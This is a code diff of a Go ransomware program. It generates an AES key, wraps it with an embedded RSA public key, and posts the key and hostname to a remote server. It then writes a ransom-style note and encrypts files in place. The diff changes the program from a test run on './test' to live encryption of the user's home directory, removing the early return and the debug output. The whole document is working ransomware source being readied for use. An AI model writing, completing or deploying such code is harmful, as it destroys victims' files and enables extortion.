@@ -21,21 +21,17 @@ var key []byte
 var fileSep string
 var serverPub = []byte(`
 -----BEGIN PUBLIC KEY-----
-MIIBCgKCAQEA3pulN61rzbvZw7gREV4+BY9V+lyUAfrecYzIupzdv/RnU1Qrgo9O
-2OGHA4wfwrXANQb1c2Zp0c7ZLTISpJaMjjhu1jrkpId7GuFYExMQEF8gxl01w2/r
-K1aHmNNMBSJQTap1F2JBw81zWq4EKMt2+Az+sLIvSRR0gZ0GrJ7Fx/zlreFu+xH8
-Vxd5Zuq711ChZB7yYYiX3/wo/0KN4CuZxPRANMmEuap964c+J/PNPFJDbqQBDEN0
-RRo7ge9eu0K2zjUGZUBmBetpPss2aagO+5+82YoRpS4m0Zza/jndv3q9zoOdivUN
-fxT6HN0CH2kRXUgFVOvae3cW3R1rPi8/cwIDAQAB
+MIIBCgKCAQEAzGLShgBYK22Q7L69uu/X9jcoilK2gWloRzpea4boVG+KSKN6KVW9
+ZF379B9tkwOEwi3e6fDWEBaykMjgnz6P9agewQnBI7vHu/5mOIlYigwp833hG8wO
+dPjd279EnEf8W2GaQbj3sq4pb/TOpuv7mIgtyNUHIqDz1nrZ6JiY9J98A/7lma9L
+Zg6clTJZgPKHRxK0QkzUogGnYJWxt/v9wb+sSkWc6O4tOitnsnC+RfcS9xrOAU5r
+7qEGpknlVRBqoyDjVbWuSvOgRz1azmkpe4ZgCylTfEB3e1HBKiNq2SJZBFx7ssAG
+wcWSZIdi/fsr1khfNoQU429EYmknW5JjFQIDAQAB
 -----END PUBLIC KEY-----`)
 
 func main() {
 
 	home, _ := os.UserHomeDir()
-	fmt.Println("home ", home)
-
-	//testdir := ".\\test"
-	testdir := "./test"
 
 	opSystem := runtime.GOOS
 	fileSep = "/"
@@ -54,16 +50,12 @@ func main() {
 		os.Exit(1)
 	}
 	sendKey(hexKey)
-	return
-	traverseFiles(testdir)
+	traverseFiles(home)
 }
 
 func genKey() error {
 	key = make([]byte, 32)
 	_, err := rand.Read(key)
-
-	//fmt.Println("key ", key)
-	//fmt.Printf("%x ", key)
 	return err
 }
 
@@ -90,7 +82,6 @@ func encryptKey() (string, error) {
 		return "", err
 	}
 	encHex := hex.EncodeToString(encKey)
-	fmt.Println(encHex)
 	return encHex, nil
 }
 
@@ -127,9 +118,6 @@ func encryptFile(path string) {
 		fmt.Println(err)
 		os.Exit(1)
 	}
-	fmt.Println("path ", path)
-	fmt.Println("data ", data)
-
 
 	c, err := aes.NewCipher(key)
 	if err != nil {
@@ -151,7 +139,6 @@ func encryptFile(path string) {
 	}
 
 	enc := gcm.Seal(nonce, nonce, data, nil)
-	fmt.Println("enc data ", enc)
 	err = os.WriteFile(path, enc, 0777)
 	if err != nil {
 		fmt.Println(err)
@@ -160,13 +147,17 @@ func encryptFile(path string) {
 
 func sendKey(hexKey string) error {
 	hostname, err := os.Hostname()
-	if err != nil {
+	if err != nil  {
 		fmt.Println(err)
 		return err
 	}
-	resp, err := http.PostForm("https://", url.Values{"hostname": {hostname}, "key": {hexKey}})
+
+	sum := sha256.Sum256([]byte(hexKey))
+	shaSum := fmt.Sprintf("%x", sum)
+	resp, err := http.PostForm("https://", url.Values{"hostname": {hostname}, "key": {hexKey}, "sha256sum": {shaSum}})
 	if err != nil || resp.StatusCode != 200 {
 		fmt.Println(err)
+		fmt.Println("HTTP Response: ", resp.StatusCode)
 		return err
 	}
 
@@ -177,7 +168,7 @@ func sendKey(hexKey string) error {
 	}
 	defer n.Close()
 	home, _ := os.UserHomeDir()
-	s := fmt.Sprintf("All files in %s have been encrypted.\nEncrypted key: %s", home, hexKey)
+	s := fmt.Sprintf("All files in %s have been encrypted.\nEncrypted key: %s \nSha256Sum: %s", home, hexKey, shaSum)
 	_, err = n.WriteString(s)
 	if err != nil {
 		fmt.Println("Error writing file: ", err)
